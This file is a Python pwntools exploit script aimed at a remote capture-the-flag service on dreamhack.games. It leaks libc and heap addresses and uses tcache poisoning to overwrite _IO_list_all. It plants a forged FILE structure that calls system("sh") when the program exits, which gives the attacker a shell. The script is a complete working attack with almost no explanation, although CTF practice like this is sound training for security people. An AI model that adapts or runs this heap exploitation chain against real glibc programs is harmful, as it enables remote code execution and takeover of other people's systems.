from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 14089
r = remote(HOST, PORT)

def alloc(idx, type, val, data=None):
    r.sendlineafter(b'>> ', b'1')
    r.sendlineafter(b': ', b'%d'%idx)
    r.sendlineafter(b': ', b'%d'%type)
    r.sendlineafter(b': ', b'%d'%val)
    if type == 4:
        r.sendafter(b': ', data)

def delete(idx):
    r.sendlineafter(b'>> ', b'2')
    r.sendlineafter(b': ', b'%d'%idx)

def read(idx):
    r.sendlineafter(b'>> ', b'3')
    r.sendlineafter(b': ', b'%d'%idx)

def write(idx, val, data=None):
    r.sendlineafter(b'>> ', b'4')
    r.sendlineafter(b': ', b'%d'%idx)
    r.sendlineafter(b': ', b'%d'%val)
    if data:
        r.sendafter(b': ', data)

def exit():
    r.sendlineafter(b'>> ', b'5')

alloc(0, 4, 0x500, data=p64(0x41414141))
alloc(1, 4, 0x10, data=p64(0x42424242))
alloc(2, 4, 0x10, data=p64(0x42424242))
alloc(3, 4, 0x10, data=p64(0x42424242))

delete(0)
alloc(0, 4, 0x500, data=b'\n')

read(0)
r.recvuntil(b'Value: ')
libc = u64(r.recv(8)) - 0x203b0a

delete(2)
delete(1)

alloc(1, 4, 0x10, data=b'\n')
alloc(2, 4, 0x10, data=b'\n')

read(1)
r.recvuntil(b'Value: ')
heap1 = u64(r.recv(8))

read(2)
r.recvuntil(b'Value: ')
heap2 = u64(r.recv(8))
heap = heap1 ^ heap2
key = heap >> 12

alloc(1, 3, 0x50)
r.sendlineafter(b'>> ', b'1')
r.sendlineafter(b': ', b'1')
r.sendlineafter(b': ', b'5')

delete(3)
delete(2)

system = libc + 0x58740
_IO_list_all = libc + 0x2044c0
_IO_wfile_jumps = libc + 0x202228
file = heap + 0x110

payload = flat({
    0x0: b'\x01\x01\x01\x01;sh\x00',
    0x20: 0,
    0x28: 1,
    0x68: system,
    0x88: file+0x100,
    0xa0: file,
    0xd8: _IO_wfile_jumps,
    0xe0: file,
},filler=b'\x00')

alloc(4, 4, len(payload), payload)
write(1, 0x50, b'A'*0x10 + p64(0) + p64(0x21) + p64(_IO_list_all^key))

alloc(5, 4, 0x10, b'A')
alloc(5, 4, 0x10, p64(file))

exit()

r.interactive()